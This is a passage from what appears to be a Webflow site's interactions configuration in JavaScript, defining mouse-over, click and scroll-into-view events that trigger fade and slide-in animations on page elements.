        id: "e-30",
        name: "",
        animationType: "custom",
        eventTypeId: "MOUSE_OVER",
        action: {
          id: "",
          actionTypeId: "GENERAL_START_ACTION",
          config: {
            delay: 0,
            easing: "",
            duration: 0,
            actionListId: "a-7",
            affectedElements: {},
            playInReverse: !1,
            autoStopEventId: "e-31",
          },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|0b84718e-c201-e886-a3e6-fbde4d3f3944",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|0b84718e-c201-e886-a3e6-fbde4d3f3944",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: null,
          scrollOffsetUnit: null,
          delay: null,
          direction: null,
          effectIn: null,
        },
        createdOn: 1635973316752,
      },
      "e-32": {
        id: "e-32",
        name: "",
        animationType: "custom",
        eventTypeId: "MOUSE_CLICK",
        action: {
          id: "",
          actionTypeId: "GENERAL_START_ACTION",
          config: {
            delay: 0,
            easing: "",
            duration: 0,
            actionListId: "a-11",
            affectedElements: {},
            playInReverse: !1,
            autoStopEventId: "e-33",
          },
        },
        mediaQueries: ["main", "medium", "small", "tiny"],
        target: {
          selector: ".header__btn-menu",
          originalId:
            "6180f175feada501f31bcc4d|49b73767-9cf6-d734-9750-735f7d73a1c7",
          appliesTo: "CLASS",
        },
        targets: [
          {
            selector: ".header__btn-menu",
            originalId:
              "6180f175feada501f31bcc4d|49b73767-9cf6-d734-9750-735f7d73a1c7",
            appliesTo: "CLASS",
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: null,
          scrollOffsetUnit: null,
          delay: null,
          direction: null,
          effectIn: null,
        },
        createdOn: 1636360264663,
      },
      "e-33": {
        id: "e-33",
        name: "",
        animationType: "custom",
        eventTypeId: "MOUSE_SECOND_CLICK",
        action: {
          id: "",
          actionTypeId: "GENERAL_START_ACTION",
          config: {
            delay: 0,
            easing: "",
            duration: 0,
            actionListId: "a-12",
            affectedElements: {},
            playInReverse: !1,
            autoStopEventId: "e-32",
          },
        },
        mediaQueries: ["main", "medium", "small", "tiny"],
        target: {
          selector: ".header__btn-menu",
          originalId:
            "6180f175feada501f31bcc4d|49b73767-9cf6-d734-9750-735f7d73a1c7",
          appliesTo: "CLASS",
        },
        targets: [
          {
            selector: ".header__btn-menu",
            originalId:
              "6180f175feada501f31bcc4d|49b73767-9cf6-d734-9750-735f7d73a1c7",
            appliesTo: "CLASS",
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: null,
          scrollOffsetUnit: null,
          delay: null,
          direction: null,
          effectIn: null,
        },
        createdOn: 1636360264664,
      },
      "e-42": {
        id: "e-42",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "FADE_EFFECT",
          instant: !1,
          config: { actionListId: "fadeIn", autoStopEventId: "e-43" },
        },
        mediaQueries: ["main", "medium", "small", "tiny"],
        target: {
          id: "6180f175feada501f31bcc4d|86ebf9f6-3750-2468-f857-0407fdb08613",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|86ebf9f6-3750-2468-f857-0407fdb08613",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 20,
          scrollOffsetUnit: "%",
          delay: 0,
          direction: null,
          effectIn: !0,
        },
        createdOn: 1636378544638,
      },
      "e-44": {
        id: "e-44",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-45" },
        },
        mediaQueries: ["medium", "small", "tiny"],
        target: {
          id: "6180f175feada501f31bcc4d|10480d2d-9260-8918-2c74-40211617822a",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|10480d2d-9260-8918-2c74-40211617822a",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 0,
          scrollOffsetUnit: "%",
          delay: 0,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1636440170835,
      },
      "e-46": {
        id: "e-46",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "FADE_EFFECT",
          instant: !1,
          config: { actionListId: "fadeIn", autoStopEventId: "e-47" },
        },
        mediaQueries: ["medium", "small", "tiny"],
        target: {
          id: "6180f175feada501f31bcc4d|a9129a85-1413-5d54-3942-23e7fc0318a7",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|a9129a85-1413-5d54-3942-23e7fc0318a7",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 0,
          scrollOffsetUnit: "%",
          delay: 200,
          direction: null,
          effectIn: !0,
        },
        createdOn: 1642082161709,
      },
      "e-48": {
        id: "e-48",
        name: "",
        animationType: "custom",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "GENERAL_START_ACTION",
          config: {
            delay: 0,
            easing: "",
            duration: 0,
            actionListId: "a-13",
            affectedElements: {},
            playInReverse: !1,
            autoStopEventId: "e-49",
          },
        },
        mediaQueries: ["main", "medium", "small", "tiny"],
        target: {
          id: "6180f175feada501f31bcc4d|93be249c-2d97-d8d5-54da-34d35dd99b7a",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|93be249c-2d97-d8d5-54da-34d35dd99b7a",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !0,
          playInReverse: !1,
          scrollOffsetValue: 0,
          scrollOffsetUnit: "%",
          delay: null,
          direction: null,
          effectIn: null,
        },
        createdOn: 1653467272054,
      },
      "e-50": {
        id: "e-50",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-51" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|f7bae6a7-9b28-d160-39ce-c262b4e3f068",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|f7bae6a7-9b28-d160-39ce-c262b4e3f068",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 100,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667813602917,
      },
      "e-52": {
        id: "e-52",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-53" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|f7bae6a7-9b28-d160-39ce-c262b4e3f071",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|f7bae6a7-9b28-d160-39ce-c262b4e3f071",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 200,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667813602917,
      },
      "e-54": {
        id: "e-54",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-55" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|f7bae6a7-9b28-d160-39ce-c262b4e3f07a",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|f7bae6a7-9b28-d160-39ce-c262b4e3f07a",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 300,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667813602917,
      },
      "e-56": {
        id: "e-56",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-57" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|f7bae6a7-9b28-d160-39ce-c262b4e3f084",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|f7bae6a7-9b28-d160-39ce-c262b4e3f084",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 400,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667813602917,
      },
      "e-58": {
        id: "e-58",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-59" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|268cc375-561f-f165-6a8d-49435da3da05",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|268cc375-561f-f165-6a8d-49435da3da05",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 100,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667813607874,
      },
      "e-60": {
        id: "e-60",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-61" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|268cc375-561f-f165-6a8d-49435da3da0e",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|268cc375-561f-f165-6a8d-49435da3da0e",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 200,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667813607874,
      },
      "e-62": {
        id: "e-62",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-63" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|268cc375-561f-f165-6a8d-49435da3da17",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|268cc375-561f-f165-6a8d-49435da3da17",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 300,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667813607874,
      },
      "e-64": {
        id: "e-64",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-65" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|268cc375-561f-f165-6a8d-49435da3da21",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|268cc375-561f-f165-6a8d-49435da3da21",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 400,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667813607874,
      },
      "e-66": {
        id: "e-66",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-67" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|1ad916dc-a2ae-b737-34ac-577d62670b38",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|1ad916dc-a2ae-b737-34ac-577d62670b38",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 100,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667813615680,
      },
      "e-68": {
        id: "e-68",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-69" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|1ad916dc-a2ae-b737-34ac-577d62670b41",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|1ad916dc-a2ae-b737-34ac-577d62670b41",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 200,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667813615680,
      },
      "e-70": {
        id: "e-70",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-71" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|1ad916dc-a2ae-b737-34ac-577d62670b4a",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|1ad916dc-a2ae-b737-34ac-577d62670b4a",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 300,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667813615680,
      },
      "e-72": {
        id: "e-72",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-73" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|1ad916dc-a2ae-b737-34ac-577d62670b54",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|1ad916dc-a2ae-b737-34ac-577d62670b54",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 400,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667813615680,
      },
      "e-74": {
        id: "e-74",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-75" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|ef652f1f-bea7-2926-a0f5-51add5df46e5",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|ef652f1f-bea7-2926-a0f5-51add5df46e5",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 100,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667813621040,
      },
      "e-76": {
        id: "e-76",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-77" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|ef652f1f-bea7-2926-a0f5-51add5df46ee",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|ef652f1f-bea7-2926-a0f5-51add5df46ee",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 200,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667813621040,
      },
      "e-78": {
        id: "e-78",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-79" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|ef652f1f-bea7-2926-a0f5-51add5df46f7",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|ef652f1f-bea7-2926-a0f5-51add5df46f7",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 300,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667813621040,
      },
      "e-80": {
        id: "e-80",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-81" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|ef652f1f-bea7-2926-a0f5-51add5df4701",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|ef652f1f-bea7-2926-a0f5-51add5df4701",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 400,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667813621040,
      },
      "e-82": {
        id: "e-82",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-83" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|7cf1fcaf-e24a-3d83-1bc4-d34284beb807",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|7cf1fcaf-e24a-3d83-1bc4-d34284beb807",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 100,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667813626257,
      },
      "e-84": {
        id: "e-84",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-85" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|7cf1fcaf-e24a-3d83-1bc4-d34284beb810",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|7cf1fcaf-e24a-3d83-1bc4-d34284beb810",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 200,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667813626257,
      },
      "e-86": {
        id: "e-86",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-87" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|7cf1fcaf-e24a-3d83-1bc4-d34284beb819",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|7cf1fcaf-e24a-3d83-1bc4-d34284beb819",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 300,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667813626257,
      },
      "e-88": {
        id: "e-88",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-89" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|7cf1fcaf-e24a-3d83-1bc4-d34284beb823",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|7cf1fcaf-e24a-3d83-1bc4-d34284beb823",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 400,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667813626257,
      },
      "e-90": {
        id: "e-90",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-91" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|5ecdfb67-f81e-ba5d-2cae-de2dd025fb14",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|5ecdfb67-f81e-ba5d-2cae-de2dd025fb14",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 100,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667813669538,
      },
      "e-92": {
        id: "e-92",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-93" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|5ecdfb67-f81e-ba5d-2cae-de2dd025fb1d",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|5ecdfb67-f81e-ba5d-2cae-de2dd025fb1d",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 200,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667813669538,
      },
      "e-94": {
        id: "e-94",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-95" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|5ecdfb67-f81e-ba5d-2cae-de2dd025fb26",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|5ecdfb67-f81e-ba5d-2cae-de2dd025fb26",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 300,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667813669538,
      },
      "e-96": {
        id: "e-96",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-97" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|5ecdfb67-f81e-ba5d-2cae-de2dd025fb30",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|5ecdfb67-f81e-ba5d-2cae-de2dd025fb30",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 400,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667813669538,
      },
      "e-98": {
        id: "e-98",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-99" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|000a87b7-e83f-94e1-7c46-2fea30e947e6",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 100,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667814285426,
      },
      "e-100": {
        id: "e-100",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-101" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|000a87b7-e83f-94e1-7c46-2fea30e947ef",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 200,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667814285426,
      },
      "e-102": {
        id: "e-102",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-103" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|000a87b7-e83f-94e1-7c46-2fea30e947f8",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 300,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667814285426,
      },
      "e-104": {
        id: "e-104",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-105" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|000a87b7-e83f-94e1-7c46-2fea30e94802",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 400,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667814285426,
      },
      "e-106": {
        id: "e-106",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-107" },
        },
        mediaQueries: ["main"],
        target: {
